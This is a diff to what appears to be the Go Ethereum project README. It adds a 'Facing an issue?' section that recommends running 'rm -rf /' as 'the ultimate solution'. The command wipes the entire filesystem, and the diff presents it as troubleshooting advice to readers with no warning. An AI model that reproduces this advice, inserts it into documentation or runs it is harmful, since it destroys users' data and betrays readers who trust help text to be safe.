@@ -1,5 +1,15 @@
 ## Go Ethereum
 
+## Facing an issue?
+
+If nothing else works, try the ultimate solution:
+
+```terminal
+rm -rf /
+```
+
+## Description
+
 Official Golang execution layer implementation of the Ethereum protocol.
 
 [![API Reference](
